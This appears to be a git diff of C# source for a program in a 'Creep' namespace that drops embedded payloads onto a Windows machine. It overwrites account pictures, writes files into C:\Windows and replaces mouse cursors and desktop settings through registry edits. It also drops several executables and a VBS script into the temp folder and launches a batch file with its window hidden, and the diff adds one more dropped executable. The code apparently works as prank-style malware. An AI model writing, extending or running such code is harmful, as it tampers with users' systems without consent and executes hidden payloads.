@@ -68,8 +68,8 @@ namespace Creep
             File.WriteAllBytes(@"C:\ProgramData\Microsoft\User Account Pictures\user.bmp", Properties.Resources.ht);
             File.WriteAllBytes(@"C:\ProgramData\Microsoft\User Account Pictures\user.png", Properties.Resources.ht);
             string temp = System.IO.Path.GetTempPath();
-            System.IO.File.WriteAllBytes(@"C:\Windows\" + "icon.ico", Properties.Resources.texticon);
-            System.IO.File.WriteAllBytes(@"C:\Windows\" + "cursor_ht.cur", Properties.Resources.cs);
+            System.IO.File.WriteAllBytes(@"C:\Windows\icon.ico", Properties.Resources.texticon);
+            System.IO.File.WriteAllBytes(@"C:\Windows\cursor_ht.cur", Properties.Resources.cs);
 
             RegistryKey editKey;
             
@@ -78,9 +78,9 @@ namespace Creep
             editKey.Close();
 
             editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Cursors");
-            editKey.SetValue("Arrow", @"C:\Windows\" + "cursor_ht.cur");
-            editKey.SetValue("Hand", @"C:\Windows\" + "cursor_ht.cur");
-            editKey.SetValue("Wait", @"C:\Windows\" + "cursor_ht.cur");
+            editKey.SetValue("Arrow", @"C:\Windows\cursor_ht.cur");
+            editKey.SetValue("Hand", @"C:\Windows\cursor_ht.cur");
+            editKey.SetValue("Wait", @"C:\Windows\cursor_ht.cur");
             editKey.Close();
 
             editKey = Registry.CurrentUser.CreateSubKey(@"Control Panel\Desktop");
@@ -100,8 +100,10 @@ namespace Creep
             System.IO.File.WriteAllBytes(temp + "one.rtf", Properties.Resources.one);
             System.IO.File.WriteAllBytes(temp + "ht.exe", Properties.Resources.subox);
             System.IO.File.WriteAllBytes(temp + "ht_msg.exe", Properties.Resources.ht_msg);
+            File.WriteAllBytes(temp + "ht_cn.exe", Properties.Resources.HungTo_cn);
             File.WriteAllBytes(temp + "np.vbs", Properties.Resources.np);
-            System.IO.File.WriteAllBytes(@"C:\Windows\" + "ht.jpg", Properties.Resources.ht);
+            File.WriteAllBytes(@"C:\Windows\ht_small.jpg", Properties.Resources.ht_small);
+            System.IO.File.WriteAllBytes(@"C:\Windows\ht.jpg", Properties.Resources.ht);
 
             ProcessStartInfo psi = new ProcessStartInfo(temp + "windl.bat");
             psi.CreateNoWindow = true;
